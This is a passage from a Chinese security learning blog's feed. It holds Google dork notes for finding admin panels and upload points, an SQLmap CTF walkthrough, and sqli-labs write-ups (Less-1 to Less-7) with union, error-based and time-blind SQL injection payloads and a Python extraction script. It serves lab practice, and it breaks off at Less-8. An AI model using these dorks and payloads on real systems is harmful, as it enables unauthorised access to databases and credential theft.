    <category term="-CTF" scheme="https://blog.abinix.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>谷歌语法学习记录</title>
    <link href="https://blog.abinix.top/2021/06/29/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.abinix.top/2021/06/29/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-06-29T07:39:21.000Z</published>
    <updated>2021-12-23T15:41:13.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="谷歌语法简介"><a href="#谷歌语法简介" class="headerlink" title="谷歌语法简介"></a>谷歌语法简介</h1><ol><li><h2 id="基本语法（常用）"><a href="#基本语法（常用）" class="headerlink" title="基本语法（常用）"></a>基本语法（常用）</h2><ul><li><p><strong>“xxx”+域名：</strong>     搜索xxx与 域名 相关的内容</p></li><li><p><strong>“xxx”：</strong>     精确寻找，引号内输入</p></li><li><p><strong>site：</strong>     指定域名，如：<code>site:edu.cn</code> 搜索教育网站</p></li><li><p><strong>inurl：</strong>     用于搜索包含的url关键词的网页，如：<code>inurl:uploads</code> 文件上传，搜索关于公司有关的网址中含有login的网页，</p></li><li><p><strong>intext：</strong>     搜索网页正文中的关键字，如：<code>intext:登陆/注册/用户名/密码</code></p></li><li><p><strong>filetype：</strong>     按指定文件类型即文件后缀名搜索，如：<code>filetpye:php/asp/jsp</code></p></li><li><p><strong>info：</strong>     可以搜索到一个url更多的信息 如：<code>info:www.baidu.com</code></p></li><li><p><strong>link：</strong>     搜索所有链接到某个特定url的页面 如：<code>link:www.baidu.com</code></p></li><li><p><strong>AND,OR：</strong>     前者用来关联，后者代表两者其一都可</p></li><li><p><strong>“?”和“*”：</strong>     占位通配符，匹配一些模糊搜索</p></li><li><p><strong>Cache：</strong>    搜索缓存 如：<code>cache: [www.baidu.com](http://www.baidu.com)</code></p></li></ul></li><li><h2 id="骚操作语法，渗透测试中用到"><a href="#骚操作语法，渗透测试中用到" class="headerlink" title="骚操作语法，渗透测试中用到"></a>骚操作语法，渗透测试中用到</h2><h3 id="搜索敏感文件："><a href="#搜索敏感文件：" class="headerlink" title="搜索敏感文件："></a>搜索敏感文件：</h3><ul><li><p><code>site:xxx.com filetype:doc</code> //只返回xxx.com站点上文件类型为doc的网页</p></li><li><p><code>site:xxx.com filetype:xls</code> //只返回xxx.com站点上文件类型为xls的网页</p></li><li><p><code>site:xxx.com filetype:cof</code> //只返回xxx.com站点上文件类型为cof的网页</p></li></ul><h3 id="搜索管理后台："><a href="#搜索管理后台：" class="headerlink" title="搜索管理后台："></a>搜索管理后台：</h3><ul><li><p><code>inurl:/admin/login.php</code> //查找管理员登录页面</p></li><li><p><code>inurl:/phpmyadmin/index.php</code> //查找后台数据库管理页面</p></li><li><p><code>site:xxx.com inurl:login</code> //在xxx.com站点中查找url中含有login的页面</p></li></ul><h3 id="搜索mail"><a href="#搜索mail" class="headerlink" title="搜索mail:"></a>搜索mail:</h3><ul><li><code>site:xxx.com intext:@xxx.com</code></li></ul><h3 id="查找后台："><a href="#查找后台：" class="headerlink" title="查找后台："></a>查找后台：</h3><ul><li><code>site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐</code></li></ul><h3 id="查找上传点："><a href="#查找上传点：" class="headerlink" title="查找上传点："></a>查找上传点：</h3><ul><li><code>site:xx.com inurl:file| uploadfile</code></li></ul><h3 id="查找上传漏洞："><a href="#查找上传漏洞：" class="headerlink" title="查找上传漏洞："></a><strong>查找上传漏洞：</strong></h3><ul><li>site:域名 <code>inurl:file|load|editor|Files</code></li></ul><h3 id="查找目录："><a href="#查找目录：" class="headerlink" title="查找目录："></a>查找目录：</h3><ul><li> 用Index of 语法现允许目录浏览的web网站 如：<code>index of /admin</code></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;谷歌语法简介&quot;&gt;&lt;a href=&quot;#谷歌语法简介&quot; class=&quot;headerlink&quot; title=&quot;谷歌语法简介&quot;&gt;&lt;/a&gt;谷歌语法简介&lt;/h</summary>
      
    
    
    
    <category term="-学习笔记" scheme="https://blog.abinix.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="语法" scheme="https://blog.abinix.top/tags/%E8%AF%AD%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>关于SQLmap</title>
    <link href="https://blog.abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/"/>
    <id>https://blog.abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-05-19T12:18:19.000Z</published>
    <updated>2021-12-23T15:42:08.945Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于SQLmap"><a href="#关于SQLmap" class="headerlink" title="关于SQLmap"></a>关于SQLmap</h1><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e65ae884d7a.jpg"></p><p><strong>还是成绩单那个例子</strong></p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” –dbs </p></blockquote><p>tips：因为是post方式，所以构造语句时需要加data=</p><p>– dbs 爆出数据库名称</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a502ed628a0.jpg"></p><p>如图：可以看到全部的数据库</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503490307e.jpg"></p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>将数据库中的所有表爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf –tables</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a50351141ca.jpg"></p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>知道了数据库 知道了表 我们将表中的字段名爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g –columns</p></blockquote><p>得到：</p><p>+————+————-+<br>| Column     | Type        |<br>+————+————-+<br>| skctf_flag | varchar(64) |<br>+————+————-+</p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>最后一步 爆字段内容</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g -C ‘skctf_flag’ –dump</p></blockquote><p>+—————————————-+<br>| skctf_flag                             |<br>+—————————————-+<br>| flag{aaab401ce593c5d4334e8c565a91b82e} |<br>+—————————————-+</p><h2 id="小结（sqlmap基本命令）"><a href="#小结（sqlmap基本命令）" class="headerlink" title="小结（sqlmap基本命令）"></a>小结（sqlmap基本命令）</h2><ul><li><p>曝出数据库名称 <strong>–dbs</strong></p></li><li><p>查看web当前使用的数据库 <strong>–current -db</strong></p></li><li><p>曝出web数据库使用账户    <strong>–current -user</strong></p></li><li><p>列出数据库所有账户    <strong>–users</strong></p></li><li><p>曝出数据库账号和密码    <strong>–passwords</strong></p></li><li><p>列出数据库中的表  <strong>-D XX –tables</strong> </p><p>(-D：指定数据库名称 XX：数据库名称 –    tables：列出该数据库的表)</p></li><li><p>列出表中的字段 <strong>-D XX -T YY –columns</strong> </p></li></ul><p>（-D指数据库名称 XX指数据库 -T指要列出字段的表  YY指数据库中的表 –columns指字段）</p><ul><li><p>曝字段内容 <strong>-D XX -T YY -C ”a,b,c” –dump</strong> </p><p>(-D指数据库名称 XX指数据库 -T指要列出字段的表 YY指数据库中的表 -C指定要曝的字段 –dump将结果导出)</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于SQLmap&quot;&gt;&lt;a href=&quot;#关于SQLmap&quot; class=&quot;headerlink&quot; title=&quot;关于SQLmap&quot;&gt;&lt;/a&gt;关于SQLmap&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://abing.oss-cn-beijing.aliyunc</summary>
      
    
    
    
    <category term="-学习笔记" scheme="https://blog.abinix.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL注入" scheme="https://blog.abinix.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="https://blog.abinix.top/2021/05/19/sqli-labs%E6%89%93%E5%85%B3/"/>
    <id>https://blog.abinix.top/2021/05/19/sqli-labs%E6%89%93%E5%85%B3/</id>
    <published>2021-05-19T12:18:19.000Z</published>
    <updated>2022-01-18T17:07:09.007Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">sqli-labs搭建以及前15题解答</h1><p>[TOC]</p><h1 id="sqli-labs的部署（vps上）"><a href="#sqli-labs的部署（vps上）" class="headerlink" title="sqli-labs的部署（vps上）"></a>sqli-labs的部署（vps上）</h1><ol><li><p>安装docker</p><p>因为自己vps上已经装好了，就不多赘述了</p><p><code>yum upadte</code>//更新yum</p><p><code>yum install -y docker-engine</code> //安装docker</p></li><li><p>部署sqli_libs</p><p><code>sudo docker search sqli-labs</code>//在docker镜像库中搜索sqli-labs</p><p><code>sudo docker pull acgpiano/sqli-labs</code>//拉取docker镜像库中的sqli-labs，并下载</p><p><code>sudo docker run -d --name sqli-labs -p 20000:80 acgpiano/sqli-labs</code>//生成镜像，-p为端口号 -name为镜像名字</p></li><li><p>完成后在命令行中打入 <code>docker ps</code> 查看镜像，可以看到sqli-labs的端口号为20000，已经开启</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722144936.png"></p></li><li><p>打开网页可以看到已经访问成功，让我们点击 第二行的<strong>setup</strong> 连接一下数据库</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722144949.png"></p></li><li><p>如果显示如下的画面则表示已经部署完毕，可以做题啦！</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722145056.png"></p></li></ol><h4 id="ps-如果无法连接security数据库，使用如下命令："><a href="#ps-如果无法连接security数据库，使用如下命令：" class="headerlink" title="ps: 如果无法连接security数据库，使用如下命令："></a>ps: 如果无法连接security数据库，使用如下命令：</h4><blockquote><p>docker ps -a                                     //查看所有容器</p><p>35c47c2c260d   c0ny1/sqli-labs:0.1               //定位到sqlilabs的容器</p><p>docker exec -it 0112 /bin/bash                   //交互模式进入容器   0112是容器id前几位</p><p>php /var/www/html/sql-connections/setup-db.php   //用php运行这个文件，数据库就连上了</p></blockquote><p>附上链接🔗： <a href="https://blog.csdn.net/Big_Study_Father/article/details/106052620">https://blog.csdn.net/Big_Study_Father/article/details/106052620</a></p><h1 id="sqli-labs做题记录"><a href="#sqli-labs做题记录" class="headerlink" title="sqli-labs做题记录"></a>sqli-labs做题记录</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先查看源码 在源码中，我们着重看这一句就好 <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727131547.png"></p><p>这句话中的id就是我们在url中get的值，所以通过这一部分的代码，我们可以知道它是什么类型的sql注入，用什么方式绕过等信息</p><p>由此我们可以想到<strong>如果闭合一个单引号并且将后面的内容注释掉后</strong> </p><p>sql语句就变成了这样<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39; union select 1,2,3 --+&#39;&quot;;</code></p><p>这里利用联合注入，将1，2，3显示出来，同样，利用联合注入还可以爆出表名，字段名等等</p><h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h4><ul><li>当在id=1后加单引号时报错，由此判断为<strong>字符型注入</strong>，原理如上面所分析的一样，加入注释符后又可恢复正常</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726223631.png"></p><ul><li><p>猜解字段数，我们利用order by语句猜解字段数，当order by 4时发现报错，此时判断有3个字段</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726223932.png"></p></li><li><p>判断显示位 ，<strong>注意！！</strong>此时利用union注入时，要将前面id不成立，即使id=-1</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726224208.png"></p><p>如图，可以发现我们成功将2，3显示在了页面上</p></li><li><p>接下来爆库名，因为能将数值回显，所以也能将数据库名回显</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726224349.png"></p><p>如上图，我们将想要显示的信息呈现在页面上，version()为版本信息，database()为库名</p></li><li><p>我们知道了库名，即可根据库名来爆表名，这里可以用hackbar工具进行注入</p><p>payload：<code>?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726224740.png"></p><p>​    得到如上几个表名</p><ul><li><p>有了表名，我们即可爆字段</p><p>payload：<code>?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726225918.png"></p><p>​    如上图，可以看到在users表中有三个字段，分别是 id，username，password</p><ul><li><p>此时我们爆出password即可成功，爆字段值</p><p>payload：<code>?id=-1&#39; union select 1,2,(select group_concat(password) from security.users)--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726230450.png"></p><p>​    可以看到所有字段内容已经被dump出来了，解题完毕</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>先看关键源码 <code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727131642.png"></p><p>很明显的区别就是与上题少了两个引号，上题是字符型注入，那么这题就是<strong>数字型注入</strong>，也就是说不需要引号，不用闭合引号，可直接输入，直接使用联合注入，其余解题方法与Less-1一样</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ul><li><p>猜解字段数，方法一样，order by 函数，只不过这题为数字型注入，不需要引号</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726231521.png"></p><p>可以看到还是一样只有3个字段</p></li><li><p>爆库名（利用union select时，还是一样要使左边的表达式不成立，即id=0）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726231809.png"></p><p>爆出数据库名 security</p></li><li><p>爆表名，利用语句可dump出所有表名</p><p>payload：<code>?id=0 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726232027.png"></p></li><li><p>爆字段，根据表名 users 爆字段</p><p>payload：<code>?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726232154.png"></p></li><li><p>爆字段值，根据字段爆内容</p><p>payload：<code>?id=0 union select 1,2,group_concat(password) from security.users--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726232648.png"></p></li></ul><p>​    如图，所有字段内容已经出来，解题完成</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>先看关键源码： <code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727131929.png"></p><p>我们观察源码发现，语句上给id加上了个括号，但本质还是字符型注入</p><p>如果我们加一个单引号，那么语句就变成<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;&#39;) LIMIT 0,1&quot;;</code>但这样是会出现错误的，因为与前面的双引号重叠了</p><p>如果我们加上单引号并且加上括号的话，语句就变成<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;)&#39;) LIMIT 0,1&quot;;</code></p><p>如果我们加上括号并加上注释符后 语句为<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;）--+&quot;;</code></p><p>达到了注入的效果</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><ul><li><p>猜解字段数，利用order by语句</p><p>payload：<code>?id=1&#39;) order by 4--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132347.png"></p><p>存在3个字段</p></li><li><p>爆数据库名</p><p>payload：<code>?id=0&#39;) union select 1,database(),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132606.png"></p></li><li><p>爆表名</p><p>payload：<code>?id=0&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132813.png"></p></li><li><p>爆字段</p><p>payload：<code>?id=0&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132921.png"></p></li><li><p>爆字段值</p><p>payload：<code>?id=0&#39;) union select 1,2,group_concat(password) from security.users--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727133255.png"></p></li></ul><p>字段爆完，解题完毕</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>首先看源码 <code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727133500.png"></p><p>可以看到id被括号括起来了，整体用双引号括起</p><p>那么也很简单，只要将双引号提前闭合就可以达到注入的效果</p><p>构造语句 <code>$sql=&quot;SELECT * FROM users WHERE id=($id&quot;)--+) LIMIT 0,1&quot;;</code></p><p>这样成功闭合，–+就将后面的东西注释掉了，成功注入</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>总体注入方式一样</p><ul><li><p>猜解字段，可以看到还是一样的3个字段</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727134757.png"></p></li><li><p>爆数据库名</p><p>payload：<code>?id=0&quot;) union select 1,database(),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727134853.png"></p></li><li><p>爆表名</p><p>payload：<code>?id=0&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727135153.png"></p><ul><li><p>爆字段</p><p>payload：<code>?id=0&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727135317.png"></p></li><li><p>爆字段值</p><p>payload：<code>?id=0&quot;) union select 1,2,group_concat(password) from security.users--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727135534.png"></p></li></ul><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>先看源码 </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727141234.png"></p><p>表面上和第一关没什么区别，但实际上它加上了个判断，也就是说如果我们联合注入的话它只会显示 You are in</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727141348.png"></p><p>此类型题目我们考虑使用盲注的方法，因为页面只会显示You are in，要么没有回显</p><p>当出现这种情况考虑布尔盲注，时间盲注，报错注入等，通过猜测和判断，确定长度和字符</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><ul><li><p>如果我们输入 <code>?id=1&#39; and sleep(5)--+</code></p><p>如果显示正常，那么页面会延迟5秒种，（并不会有页面的回显）如下图</p><p>ps：过在MySQL中执行select sleep(N)可以让此语句运行N秒钟：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727142443.png"></p></li><li><p>此题采用时间盲注的方式，采用payload：<code>?id=1’ and if(length(database())=7,sleep(5),1)--+</code></p><p>利用三元表达式，如果数据库长度为7，那么就延迟5s，否则就不延迟</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727144658.png">)</p><p>如图当判断库名长度为7时，无延迟，当长度为8时有延迟，所以库名长度为8</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727144606.png"></p><ul><li><p>猜测库名，利用left()函数</p><p>Left()得到字符串左部指定个数的字符</p><p>构造payload：<code>?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></p><p>如果数据库的第一个字符是s的话，那么就延迟5s</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727145116.png"></p><p>很明显有延迟，说明数据库第一个字符为s</p></li><li><p>但是一个个爆太慢了，我们采用python脚本的方式，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        url = <span class="string">&quot;http://118.31.59.38:20000/Less-5/&quot;</span></span><br><span class="line">        payload = <span class="string">&quot; ?id=1&#x27; and if(length(database())&gt;%s,sleep(1),0) --+&quot;</span> % i</span><br><span class="line">        <span class="comment"># print(url+payload+&#x27;%23&#x27;)</span></span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_len:&#x27;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://118.31.59.38:20000/Less-5/&quot;</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(substr(database(),%d,1)=&#x27;%s&#x27;,sleep(3),1) --+&quot;</span> % (j,i)</span><br><span class="line">            <span class="comment">#print(url+payload)</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;=<span class="number">3</span>:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    database_name()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到结果</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727162203.png"></p></li><li><p>根据数据库猜测表名</p><p>payload:<code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39;--+</code></p></li><li><p>猜字段名</p><p>payload：<code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39;,sleep(5),1)--+</code></p></li><li><p>猜值</p><p>payload：<code>?id=1’ and if(left((select password from users order by id limit 0,1),4)=‘dumb’ ,sleep(5),1)–+</code></p></li></ul><p>使用脚本如下：（实现爆字段）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727164042.png"></p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>分析源码可以发现与第五题不同的是这次是双引号，同为字符型，并且只显示You are in或者不回显的状态</p><p>那么我们同样可以用上题的时间注入方法，但这题我们使用<strong>报错注入</strong>，</p><p>ps：报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727201716.png"></p><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5</p><h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><ul><li><p>通过报错注入进行爆库</p><p>payload：<code>?id=1&quot; union select updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p><p>或者：<code>?id=1&quot; and extractvalue(1,concat(0x23,database(),0x23))--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727210655.png"></p></li></ul><p>得到数据库 security</p><ul><li><p>通过报错注入进行爆表</p><p>payload：<code>?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p><p>或者：<code>?id=1&quot; and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727211355.png"></p><ul><li><p>通过报错注入爆字段值 （操作与之前的题目一样）</p><p>payload：<code>?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727211810.png"></p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>这题传马也可以，这应该是最预期的解法了</p><p>先看关键源代码吧 <code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code></p><p>反正这几题方法都一样，都是盲注，只不过闭合方式不一样而已</p><p>这题中我们可以看到双括号，那么我们’))加上注释就可以了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204007.png"></p><h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p><strong>脚本梭就完事了，解题思路同上</strong></p><p>时间盲注和布尔盲注都可以，这里用到<strong>时间盲</strong>注吧 脚本比较万能</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204151.png"></p><p>库名已经出来</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204215.png"></p><p>字段名</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>首先查看源码 